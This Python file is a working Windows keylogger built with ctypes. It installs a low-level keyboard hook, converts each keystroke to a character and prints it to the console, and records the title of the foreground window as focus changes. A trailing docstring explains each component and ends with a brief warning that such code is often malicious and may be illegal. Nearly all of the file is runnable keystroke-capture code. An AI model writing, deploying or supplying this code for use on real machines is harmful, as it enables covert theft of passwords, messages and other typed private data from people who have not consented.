from ctypes import * 
from ctypes import wintypes
from ctypes import windll


user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE,)
GetWindowTextLengthA.restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state), )
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
	_fields_ = [("vkCode", wintypes.DWORD),
				("scanCode", wintypes.DWORD),
				("flags", wintypes.DWORD),
				("time", wintypes.DWORD),
				("dwExtraInfo", wintypes.DWORD)]

def get_foreground_process():
	hwnd = user32.GetForegroundWindow()
	length = GetWindowTextLengthA(hwnd)
	buff = create_string_buffer(length + 1)
	GetWindowTextA(hwnd, buff, length + 1)
	return buff.value

#print(get_foreground_process())

def hook_function(nCode, WParam, lParam):
	global last
	if last != get_foreground_process():
		last = get_foreground_process()
		print("\n[{}]".format(last.decode("latin-1")))
	
	if WParam == WM_KEYDOWN:
		keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

		state = (wintypes.BYTE * 256)()
		GetKeyState(WM_SHIFT)
		GetKeyboardState(byref(state))

		buf = (c_ushort * 1)()
		n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

		if n > 0:
			if keyboard.vkCode == WM_RETURN:
				print()
			else:
				print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True)


	return CallNextHookEx(hook, nCode, WParam, lParam)


last = None
callback = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)
msg = wintypes.MSG()
GetMessageA(byref(msg), 0, 0, 0)




"""
This Python code uses the ctypes library to create a keylogger for Windows. It leverages the SetWindowsHookEx function from the Windows API to set up a Low-Level Keyboard Hook (WH_KEYBOARD_LL). The keylogger captures and prints the keystrokes, focusing on the foreground window, and also detects when the Enter key is pressed, printing a new line.

Here's a breakdown of the key components:

Hook Function:

The hook_function is called whenever there's a keyboard event. It checks if the foreground process has changed and prints the process name when it does. It also captures and prints the keystrokes.
Foreground Process Detection:

The get_foreground_process function retrieves the name of the foreground process.
Low-Level Keyboard Hook Setup:

It uses SetWindowsHookExA to set up the low-level keyboard hook. The hook function (hook_function) is then passed to it.
Message Loop:

The code enters a message loop using GetMessageA. This loop keeps the application running, allowing the hook to capture and process messages.
Key State Handling:

The code uses functions like GetKeyState, GetKeyboardState, and ToAscii to handle the state of keys, such as Shift, and to convert virtual key codes to ASCII characters.
Note: This kind of keylogger code is often considered malicious, and using it without the consent of users is a violation of privacy and may be illegal. It's important to use such code responsibly and ethically.
"""